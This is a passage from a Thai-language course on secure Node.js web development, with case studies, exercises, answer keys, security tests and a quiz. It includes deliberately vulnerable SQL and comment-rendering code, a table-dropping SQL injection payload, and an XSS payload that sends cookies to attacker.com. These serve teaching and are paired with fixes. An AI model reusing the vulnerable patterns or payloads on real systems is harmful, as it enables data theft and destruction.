// Error Handler ที่ปลอดภัย
app.use((error, req, res, next) => {
    // Log error details
    logger.error('Application Error', {
        message: error.message,
        stack: error.stack,
        url: req.url,
        method: req.method,
        ip: req.ip,
        userAgent: req.get('User-Agent')
    });
    
    // ไม่เปิดเผยรายละเอียด error ใน production
    if (process.env.NODE_ENV === 'production') {
        res.status(500).json({
            error: 'เกิดข้อผิดพลาดภายในระบบ',
            id: error.id || 'unknown'
        });
    } else {
        res.status(500).json({
            error: error.message,
            stack: error.stack
        });
    }
});

// การตรวจจับความผิดปกติ
const suspiciousActivityDetector = {
    attempts: new Map(),
    
    recordFailedAttempt(ip, action) {
        const key = `${ip}:${action}`;
        const attempts = this.attempts.get(key) || 0;
        this.attempts.set(key, attempts + 1);
        
        if (attempts + 1 >= 5) {
            logSecurityEvent('SUSPICIOUS_ACTIVITY', {
                ip,
                action,
                attempts: attempts + 1
            });
        }
    },
    
    clearAttempts(ip, action) {
        const key = `${ip}:${action}`;
        this.attempts.delete(key);
    }
};
```

---

## 7. กรณีศึกษาและแบบฝึกหัด {#case-studies}

### กรณีศึกษา 1: SQL Injection ในระบบ E-commerce

**สถานการณ์:** ระบบ E-commerce มีฟังก์ชันค้นหาสินค้าที่มีช่องโหว่ SQL Injection

```javascript
// โค้ดเริ่มต้นที่มีช่องโหว่
app.get('/products/search', (req, res) => {
    const searchTerm = req.query.q;
    const query = `SELECT * FROM products WHERE name LIKE '%${searchTerm}%'`;
    
    db.query(query, (err, results) => {
        if (err) {
            return res.status(500).send('Database error');
        }
        res.json(results);
    });
});
```

**การโจมตี:**
```
GET /products/search?q='; DROP TABLE products; --
```

**การแก้ไข:**
```javascript
// โค้ดที่ปลอดภัย
app.get('/products/search', [
    query('q').escape().isLength({min: 1, max: 100})
], (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).json({ errors: errors.array() });
    }
    
    const searchTerm = req.query.q;
    const query = 'SELECT * FROM products WHERE name LIKE ? AND active = 1';
    
    db.query(query, [`%${searchTerm}%`], (err, results) => {
        if (err) {
            logger.error('Database search error', {
                error: err.message,
                searchTerm,
                ip: req.ip
            });
            return res.status(500).json({ error: 'Search failed' });
        }
        res.json(results);
    });
});
```

### กรณีศึกษา 2: XSS ในระบบ Comment

**สถานการณ์:** เว็บไซต์ข่าวมีระบบแสดงความคิดเห็นที่เสี่ยงต่อ XSS

```javascript
// โค้ดเริ่มต้นที่มีช่องโหว่
app.post('/comments', (req, res) => {
    const { articleId, comment } = req.body;
    
    // เก็บ comment ลงในฐานข้อมูลโดยตรง
    db.query(
        'INSERT INTO comments (article_id, content, created_at) VALUES (?, ?, NOW())',
        [articleId, comment]
    );
    
    res.json({ message: 'Comment added' });
});

app.get('/comments/:articleId', (req, res) => {
    const articleId = req.params.articleId;
    
    db.query(
        'SELECT content, created_at FROM comments WHERE article_id = ?',
        [articleId],
        (err, results) => {
            if (err) {
                return res.status(500).send('Database error');
            }
            
            // แสดงผล comment โดยไม่มีการป้องกัน
            const html = results.map(comment => 
                `<div class="comment">
                    <p>${comment.content}</p>
                    <small>${comment.created_at}</small>
                </div>`
            ).join('');
            
            res.send(`<div class="comments">${html}</div>`);
        }
    );
});
```

**Payload การโจมตี:**
```html
<script>
    // ขโมย cookies
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: document.cookie
    });
</script>
```

**การแก้ไข:**
```javascript
const DOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');

const window = new JSDOM('').window;
const purify = DOMPurify(window);

// โค้ดที่ปลอดภัย
app.post('/comments', [
    body('articleId').isInt(),
    body('comment').isLength({min: 1, max: 1000}).trim()
], (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).json({ errors: errors.array() });
    }
    
    const { articleId, comment } = req.body;
    
    // ทำความสะอาด HTML
    const cleanComment = purify.sanitize(comment);
    
    db.query(
        'INSERT INTO comments (article_id, content, created_at) VALUES (?, ?, NOW())',
        [articleId, cleanComment]
    );
    
    res.json({ message: 'Comment added successfully' });
});

app.get('/comments/:articleId', (req, res) => {
    const articleId = req.params.articleId;
    
    db.query(
        'SELECT content, created_at FROM comments WHERE article_id = ?',
        [articleId],
        (err, results) => {
            if (err) {
                logger.error('Database error', err);
                return res.status(500).json({ error: 'Unable to load comments' });
            }
            
            // HTML encode เพิ่มเติมก่อนแสดงผล
            const safeComments = results.map(comment => ({
                content: htmlEncode(comment.content),
                created_at: comment.created_at
            }));
            
            res.json(safeComments);
        }
    );
});

function htmlEncode(str) {
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
}
```

### แบบฝึกหัดที่ 1: การวิเคราะห์ช่องโหว่

**โจทย์:** วิเคราะห์โค้ดต่อไปนี้และระบุช่องโหว่ที่เป็นไปได้

```javascript
const express = require('express');
const mysql = require('mysql');
const app = express();

app.use(express.json());

const db = mysql.createConnection({
    host: 'localhost',
    user: 'root',
    password: '',
    database: 'myapp'
});

// การสมัครสมาชิก
app.post('/register', (req, res) => {
    const { username, password, email } = req.body;
    
    const query = `INSERT INTO users (username, password, email) 
                   VALUES ('${username}', '${password}', '${email}')`;
    
    db.query(query, (err, result) => {
        if (err) {
            res.status(500).send(err.message);
        } else {
            res.json({ message: 'User registered successfully' });
        }
    });
});

// การเข้าสู่ระบบ
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    
    const query = `SELECT * FROM users 
                   WHERE username='${username}' AND password='${password}'`;
    
    db.query(query, (err, results) => {
        if (err) {
            res.status(500).send(err.message);
        } else if (results.length > 0) {
            res.json({ 
                message: 'Login successful',
                user: results[0]
            });
        } else {
            res.status(401).send('Invalid credentials');
        }
    });
});

// ดูโปรไฟล์ผู้ใช้
app.get('/profile/:id', (req, res) => {
    const userId = req.params.id;
    
    const query = `SELECT * FROM users WHERE id=${userId}`;
    
    db.query(query, (err, results) => {
        if (err) {
            res.status(500).send(err.message);
        } else {
            res.json(results[0]);
        }
    });
});

app.listen(3000, () => {
    console.log('Server running on port 3000');
});
```

**เฉลย:**
1. **SQL Injection** - ทุก query ใช้ string concatenation
2. **Plain text password** - รหัสผ่านไม่ได้เข้ารหัส
3. **Information disclosure** - ส่ง error message กลับไปยัง client
4. **No input validation** - ไม่มีการตรวจสอบ input
5. **IDOR** - endpoint `/profile/:id` ไม่ตรวจสอบสิทธิ์
6. **No authentication** - ไม่มีการยืนยันตัวตน

### แบบฝึกหัดที่ 2: การสร้างระบบ Authentication ที่ปลอดภัย

**โจทย์:** สร้างระบบ Authentication ที่มีความปลอดภัยสูงด้วยคุณสมบัติต่อไปนี้:
- Password hashing ด้วย bcrypt
- JWT token-based authentication
- Rate limiting สำหรับ login attempts
- Input validation
- Error handling ที่ปลอดภัย

**ตัวอย่างคำตอบ:**
```javascript
const express = require('express');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const rateLimit = require('express-rate-limit');
const { body, validationResult } = require('express-validator');
const helmet = require('helmet');

const app = express();

// Security middleware
app.use(helmet());
app.use(express.json({ limit: '10mb' }));

// Rate limiting สำหรับ login
const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 นาที
    max: 5, // 5 ความพยายามต่อ IP
    message: 'ความพยายามเข้าสู่ระบบมากเกินไป กรุณาลองใหม่ในภายหัลง',
    standardHeaders: true,
    legacyHeaders: false
});

class AuthService {
    constructor() {
        this.failedAttempts = new Map();
        this.maxFailedAttempts = 3;
        this.lockoutDuration = 30 * 60 * 1000; // 30 นาที
    }
    
    async hashPassword(password) {
        const saltRounds = 12;
        return await bcrypt.hash(password, saltRounds);
    }
    
    async verifyPassword(password, hashedPassword) {
        return await bcrypt.compare(password, hashedPassword);
    }
    
    generateTokens(user) {
        const payload = {
            userId: user.id,
            username: user.username,
            roles: user.roles
        };
        
        const accessToken = jwt.sign(payload, process.env.JWT_SECRET, {
            expiresIn: '15m',
            issuer: 'secure-app'
        });
        
        const refreshToken = jwt.sign(
            { userId: user.id, type: 'refresh' },
            process.env.REFRESH_SECRET,
            { expiresIn: '7d' }
        );
        
        return { accessToken, refreshToken };
    }
    
    isAccountLocked(username) {
        const attempts = this.failedAttempts.get(username);
        if (!attempts) return false;
        
        if (attempts.count >= this.maxFailedAttempts) {
            const timeSinceLock = Date.now() - attempts.lockedAt;
            return timeSinceLock < this.lockoutDuration;
        }
        
        return false;
    }
    
    recordFailedAttempt(username) {
        const attempts = this.failedAttempts.get(username) || { count: 0 };
        attempts.count += 1;
        
        if (attempts.count >= this.maxFailedAttempts) {
            attempts.lockedAt = Date.now();
        }
        
        this.failedAttempts.set(username, attempts);
    }
    
    clearFailedAttempts(username) {
        this.failedAttempts.delete(username);
    }
}

const authService = new AuthService();

// Validation middleware
const registerValidation = [
    body('username')
        .isLength({ min: 3, max: 20 })
        .matches(/^[a-zA-Z0-9_]+$/)
        .withMessage('ชื่อผู้ใช้ต้องมี 3-20 ตัวอักษร และประกอบด้วย a-z, A-Z, 0-9, _ เท่านั้น'),
    body('email')
        .isEmail()
        .normalizeEmail()
        .withMessage('รูปแบบอีเมลไม่ถูกต้อง'),
    body('password')
        .isLength({ min: 8 })
        .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]/)
        .withMessage('รหัสผ่านต้องมีอย่างน้อย 8 ตัวอักษร ประกอบด้วย ตัวอักษรเล็ก ใหญ่ ตัวเลข และอักขระพิเศษ')
];

const loginValidation = [
    body('username').trim().isLength({ min: 1 }).withMessage('กรุณาระบุชื่อผู้ใช้'),
    body('password').isLength({ min: 1 }).withMessage('กรุณาระบุรหัสผ่าน')
];

// Authentication middleware
function authenticateToken(req, res, next) {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    
    if (!token) {
        return res.status(401).json({ error: 'Access token required' });
    }
    
    jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
        if (err) {
            return res.status(403).json({ error: 'Invalid or expired token' });
        }
        req.user = user;
        next();
    });
}

// Register endpoint
app.post('/register', registerValidation, async (req, res) => {
    try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
            return res.status(400).json({
                error: 'Validation failed',
                details: errors.array()
            });
        }
        
        const { username, email, password } = req.body;
        
        // ตรวจสอบว่ามีผู้ใช้อยู่แล้วหรือไม่
        const existingUser = await db.query(
            'SELECT id FROM users WHERE username = ? OR email = ?',
            [username, email]
        );
        
        if (existingUser.length > 0) {
            return res.status(409).json({
                error: 'ชื่อผู้ใช้หรืออีเมลนี้มีการใช้งานแล้ว'
            });
        }
        
        // Hash password
        const hashedPassword = await authService.hashPassword(password);
        
        // บันทึกผู้ใช้ใหม่
        const result = await db.query(
            'INSERT INTO users (username, email, password_hash, created_at) VALUES (?, ?, ?, NOW())',
            [username, email, hashedPassword]
        );
        
        res.status(201).json({
            message: 'สมัครสมาชิกสำเร็จ',
            userId: result.insertId
        });
        
    } catch (error) {
        console.error('Registration error:', error);
        res.status(500).json({
            error: 'เกิดข้อผิดพลาดในการสมัครสมาชิก'
        });
    }
});

// Login endpoint
app.post('/login', loginLimiter, loginValidation, async (req, res) => {
    try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
            return res.status(400).json({
                error: 'Validation failed',
                details: errors.array()
            });
        }
        
        const { username, password } = req.body;
        
        // ตรวจสอบว่าบัญชีถูกล็อคหรือไม่
        if (authService.isAccountLocked(username)) {
            return res.status(423).json({
                error: 'บัญชีถูกล็อค กรุณาลองใหม่ในภายหลัง'
            });
        }
        
        // ค้นหาผู้ใช้
        const users = await db.query(
            'SELECT id, username, email, password_hash, roles FROM users WHERE username = ?',
            [username]
        );
        
        if (users.length === 0) {
            authService.recordFailedAttempt(username);
            return res.status(401).json({
                error: 'ชื่อผู้ใช้หรือรหัสผ่านไม่ถูกต้อง'
            });
        }
        
        const user = users[0];
        
        // ตรวจสอบรหัสผ่าน
        const isPasswordValid = await authService.verifyPassword(password, user.password_hash);
        
        if (!isPasswordValid) {
            authService.recordFailedAttempt(username);
            return res.status(401).json({
                error: 'ชื่อผู้ใช้หรือรหัสผ่านไม่ถูกต้อง'
            });
        }
        
        // เข้าสู่ระบบสำเร็จ - ล้างการบันทึกความผิดพลาด
        authService.clearFailedAttempts(username);
        
        // สร้าง tokens
        const tokens = authService.generateTokens(user);
        
        // บันทึก login log
        await db.query(
            'INSERT INTO login_logs (user_id, ip_address, user_agent, login_time) VALUES (?, ?, ?, NOW())',
            [user.id, req.ip, req.get('User-Agent')]
        );
        
        res.json({
            message: 'เข้าสู่ระบบสำเร็จ',
            accessToken: tokens.accessToken,
            refreshToken: tokens.refreshToken,
            user: {
                id: user.id,
                username: user.username,
                email: user.email
            }
        });
        
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({
            error: 'เกิดข้อผิดพลาดในการเข้าสู่ระบบ'
        });
    }
});

// Protected route example
app.get('/profile', authenticateToken, async (req, res) => {
    try {
        const users = await db.query(
            'SELECT id, username, email, created_at FROM users WHERE id = ?',
            [req.user.userId]
        );
        
        if (users.length === 0) {
            return res.status(404).json({ error: 'ไม่พบข้อมูลผู้ใช้' });
        }
        
        res.json(users[0]);
        
    } catch (error) {
        console.error('Profile error:', error);
        res.status(500).json({
            error: 'ไม่สามารถดึงข้อมูลโปรไฟล์ได้'
        });
    }
});
```

### แบบฝึกหัดที่ 3: การป้องกัน CSRF

**โจทย์:** สร้างระบบที่ป้องกัน CSRF Attack สำหรับฟอร์มโอนเงิน

```javascript
const csrf = require('csurf');
const cookieParser = require('cookie-parser');

app.use(cookieParser());

// CSRF Protection
const csrfProtection = csrf({
    cookie: {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'strict'
    }
});

// Apply CSRF protection to sensitive routes
app.use('/api/transfer', csrfProtection);
app.use('/api/account', csrfProtection);

// Transfer money endpoint
app.post('/api/transfer', authenticateToken, [
    body('toAccount').isNumeric().isLength({ min: 10, max: 12 }),
    body('amount').isFloat({ min: 0.01, max: 1000000 }),
    body('description').optional().isLength({ max: 200 })
], async (req, res) => {
    try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
            return res.status(400).json({
                error: 'ข้อมูลไม่ถูกต้อง',
                details: errors.array()
            });
        }
        
        const { toAccount, amount, description } = req.body;
        const fromUserId = req.user.userId;
        
        // ตรวจสอบยอดเงินในบัญชี
        const accounts = await db.query(
            'SELECT balance FROM accounts WHERE user_id = ?',
            [fromUserId]
        );
        
        if (accounts.length === 0 || accounts[0].balance < amount) {
            return res.status(400).json({
                error: 'ยอดเงินในบัญชีไม่เพียงพอ'
            });
        }
        
        // ตรวจสอบบัญชีปลายทาง
        const targetAccounts = await db.query(
            'SELECT id FROM accounts WHERE account_number = ?',
            [toAccount]
        );
        
        if (targetAccounts.length === 0) {
            return res.status(404).json({
                error: 'ไม่พบบัญชีปลายทาง'
            });
        }
        
        // Transaction
        await db.beginTransaction();
        
        try {
            // หักเงินจากบัญชีต้นทาง
            await db.query(
                'UPDATE accounts SET balance = balance - ? WHERE user_id = ?',
                [amount, fromUserId]
            );
            
            // เพิ่มเงินในบัญชีปลายทาง
            await db.query(
                'UPDATE accounts SET balance = balance + ? WHERE account_number = ?',
                [amount, toAccount]
            );
            
            // บันทึก transaction log
            await db.query(
                'INSERT INTO transactions (from_user_id, to_account, amount, description, created_at) VALUES (?, ?, ?, ?, NOW())',
                [fromUserId, toAccount, amount, description]
            );
            
            await db.commit();
            
            res.json({
                message: 'โอนเงินสำเร็จ',
                transactionId: result.insertId,
                amount: amount,
                toAccount: toAccount
            });
            
        } catch (transactionError) {
            await db.rollback();
            throw transactionError;
        }
        
    } catch (error) {
        console.error('Transfer error:', error);
        res.status(500).json({
            error: 'เกิดข้อผิดพลาดในการโอนเงิน'
        });
    }
});

// Get CSRF token endpoint
app.get('/api/csrf-token', csrfProtection, (req, res) => {
    res.json({
        csrfToken: req.csrfToken()
    });
});
```

### การทดสอบความปลอดภัย (Security Testing)

#### 1. Unit Testing สำหรับ Security Functions
```javascript
const { expect } = require('chai');
const { AuthService } = require('../services/auth');

describe('AuthService Security Tests', () => {
    let authService;
    
    beforeEach(() => {
        authService = new AuthService();
    });
    
    describe('Password Hashing', () => {
        it('should hash passwords with sufficient complexity', async () => {
            const password = 'Test123!@#';
            const hashedPassword = await authService.hashPassword(password);
            
            expect(hashedPassword).to.not.equal(password);
            expect(hashedPassword).to.match(/^\$2[aby]\$\d+\$/); // bcrypt format
            expect(hashedPassword.length).to.be.greaterThan(50);
        });
        
        it('should generate different hashes for same password', async () => {
            const password = 'Test123!@#';
            const hash1 = await authService.hashPassword(password);
            const hash2 = await authService.hashPassword(password);
            
            expect(hash1).to.not.equal(hash2);
        });
    });
    
    describe('Account Lockout', () => {
        it('should lock account after max failed attempts', () => {
            const username = 'testuser';
            
            // Record failed attempts
            for (let i = 0; i < 3; i++) {
                authService.recordFailedAttempt(username);
            }
            
            expect(authService.isAccountLocked(username)).to.be.true;
        });
        
        it('should unlock account after lockout duration', (done) => {
            authService.lockoutDuration = 100; // 100ms for testing
            const username = 'testuser';
            
            // Lock account
            for (let i = 0; i < 3; i++) {
                authService.recordFailedAttempt(username);
            }
            
            expect(authService.isAccountLocked(username)).to.be.true;
            
            setTimeout(() => {
                expect(authService.isAccountLocked(username)).to.be.false;
                done();
            }, 150);
        });
    });
});
```

#### 2. Integration Testing
```javascript
const request = require('supertest');
const app = require('../app');

describe('Security Integration Tests', () => {
    describe('SQL Injection Protection', () => {
        it('should reject SQL injection attempts in login', async () => {
            const maliciousInput = "admin'; DROP TABLE users; --";
            
            const response = await request(app)
                .post('/login')
                .send({
                    username: maliciousInput,
                    password: 'password'
                });
            
            expect(response.status).to.equal(400);
            expect(response.body.error).to.contain('Validation failed');
        });
    });
    
    describe('XSS Protection', () => {
        it('should sanitize HTML in user input', async () => {
            const maliciousScript = '<script>alert("xss")</script>';
            
            const loginResponse = await request(app)
                .post('/login')
                .send({
                    username: 'testuser',
                    password: 'testpass'
                });
            
            const token = loginResponse.body.accessToken;
            
            const response = await request(app)
                .post('/comments')
                .set('Authorization', `Bearer ${token}`)
                .send({
                    articleId: 1,
                    comment: maliciousScript
                });
            
            expect(response.status).to.equal(200);
            
            // Verify the script tag was removed/escaped
            const commentsResponse = await request(app)
                .get('/comments/1');
            
            expect(commentsResponse.text).to.not.contain('<script>');
        });
    });
    
    describe('CSRF Protection', () => {
        it('should reject requests without CSRF token', async () => {
            const loginResponse = await request(app)
                .post('/login')
                .send({
                    username: 'testuser',
                    password: 'testpass'
                });
            
            const token = loginResponse.body.accessToken;
            
            const response = await request(app)
                .post('/api/transfer')
                .set('Authorization', `Bearer ${token}`)
                .send({
                    toAccount: '1234567890',
                    amount: 1000
                });
            
            expect(response.status).to.equal(403);
            expect(response.body.error).to.contain('CSRF');
        });
    });
});
```

---

## สรุปและแนวทางการพัฒนาต่อ

### สิ่งสำคัญที่ต้องจำ

1. **Security by Design** - ออกแบบระบบโดยคำนึงถึงความปลอดภัยตั้งแต่เริ่มต้น
2. **Defense in Depth** - ใช้หลายชั้นการป้องกัน
3. **Principle of Least Privilege** - ให้สิทธิ์เฉพาะที่จำเป็น
4. **Regular Updates** - อัปเดต Dependencies และ Security Patches อย่างสม่ำเสมอ
5. **Security Testing** - ทำการทดสอบความปลอดภัยอย่างต่อเนื่อง

### Tools และ Resources สำหรับการพัฒนาเพิ่มเติม

#### Security Scanning Tools
```bash
# SAST (Static Application Security Testing)
npm install -g eslint-plugin-security
npm install -g semgrep

# DAST (Dynamic Application Security Testing)
# OWASP ZAP
# Burp Suite

# Dependency Scanning
npm audit
npm install -g snyk
snyk test
```

#### Useful Libraries
```json
{
  "dependencies": {
    "helmet": "^7.0.0",
    "express-rate-limit": "^6.7.0",
    "express-validator": "^6.15.0",
    "bcrypt": "^5.1.0",
    "jsonwebtoken": "^9.0.0",
    "dompurify": "^3.0.0",
    "csurf": "^1.11.0",
    "cors": "^2.8.5"
  }
}
```

### การอ่านเพิ่มเติม

1. **OWASP Top 10** - https://owasp.org/Top10/
2. **OWASP Cheat Sheet Series** - https://cheatsheetseries.owasp.org/
3. **Mozilla Web Security Guidelines** - https://infosec.mozilla.org/guidelines/web_security
4. **SANS Secure Coding Practices** - https://www.sans.org/white-papers/2172/

### แบบทดสอบท้ายบท

**คำถามปรนัย:**
1. OWASP Top 10 อันดับ 1 ในปี 2021 คือ?
   - a) SQL Injection
   - b) Cross-Site Scripting
   - c) Broken Access Control ✓
   - d) Security Misconfiguration

2. การป้องกัน SQL Injection ที่ดีที่สุดคือ?
   - a) Input validation เพียงอย่างเดียว
   - b) Prepared Statements/Parameterized Queries ✓
   - c) การใช้ Stored Procedures เพียงอย่างเดียว
   - d) การ encode input

3. XSS ย่อมาจาก?
   - a) XML Site Scripting
   - b) Cross-Site Scripting ✓
   - c) Cross-Server Scripting
   - d) eXternal Site Scripting

**คำถามอัตนัย:**
1. อธิบายความแตกต่างระหว่าง Stored XSS, Reflected XSS, และ DOM-based XSS พร้อมยกตัวอย่าง
2. เขียนโค้ด Node.js ที่ป้องกัน CSRF Attack สำหรับฟอร์มเปลี่ยนรหัสผ่าน
3. วิเคราะห์และแก้ไขช่องโหว่ใน API endpoint ที่ให้มา

---

**หมายเหตุ:** เนื้อหานี้เป็นพื้นฐานสำคัญสำหรับการพัฒนาเว็บแอปพลิเคชันที่มีความปลอดภัย นักศึกษาควรฝึกปฏิบัติและทดลองใช้เครื่องมือต่างๆ เพื่อเข้าใจลึกซึ้งยิ่งขึ้น